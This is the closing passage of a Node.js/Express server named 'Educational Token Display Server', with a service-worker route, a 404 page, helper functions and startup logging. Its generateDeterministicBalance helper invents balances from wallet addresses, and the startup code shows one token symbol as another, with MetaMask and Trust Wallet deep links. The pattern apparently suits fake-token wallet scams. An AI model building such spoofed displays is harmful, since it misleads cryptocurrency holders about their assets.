        fetch(event.request)
          .catch(() => {
            return caches.match(event.request);
          })
      );
    });
  `;
  
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Service-Worker-Allowed', '/');
  res.send(serviceWorker);
});

// 404 catch-all route
app.use((req, res, next) => {
  res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>404 - Page Not Found</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          text-align: center; 
          padding: 50px; 
        }
      </style>
    </head>
    <body>
      <h1>404 - Page Not Found</h1>
      <p>The page you are looking for does not exist.</p>
      <a href="/">Return to Home</a>
    </body>
    </html>
  `);
});

// =========================================================
// HELPER FUNCTIONS
// =========================================================

// Format token amount consistently
function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount)) return '0.00';
  return parsedAmount.toFixed(2); // Always 2 decimal places for display
}

// Generate a deterministic balance for an address
function generateDeterministicBalance(address) {
  // Create a hash from the address
  let hash = 0;
  for (let i = 0; i < address.length; i++) {
    const char = address.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  
  // Generate a number between 0.01 and 100.00
  const min = 0.01;
  const max = 100.00;
  // Use hash to create a deterministic random number in range
  const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
  const balance = min + (normalizedHash * (max - min));
  
  return balance.toFixed(2); // Format to 2 decimal places
}

// =========================================================
// SERVER STARTUP
// =========================================================

// Initialize price cache warmer
priceCacheWarmer.init();

// Start the server
server.listen(port, () => {
  console.log("======================================");
  console.log("Educational Token Display Server");
  console.log("======================================");
  console.log("Server running on port: " + port);
  console.log("Token Display: " + TOKEN_CONFIG.actualSymbol + " → " + TOKEN_CONFIG.displaySymbol);
  console.log("Network: " + TOKEN_CONFIG.networkName + " (" + TOKEN_CONFIG.networkId + ")");
  console.log("Contract: " + TOKEN_CONFIG.address);
  console.log("Decimals: " + TOKEN_CONFIG.decimals);
  console.log("API Health Check: http://localhost:" + port + "/api/token-info");
  console.log("MetaMask Deep Link: metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1");
  console.log("Trust Wallet Deep Link: trust://ethereum/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=1");
  console.log("======================================");
});

module.exports = app;
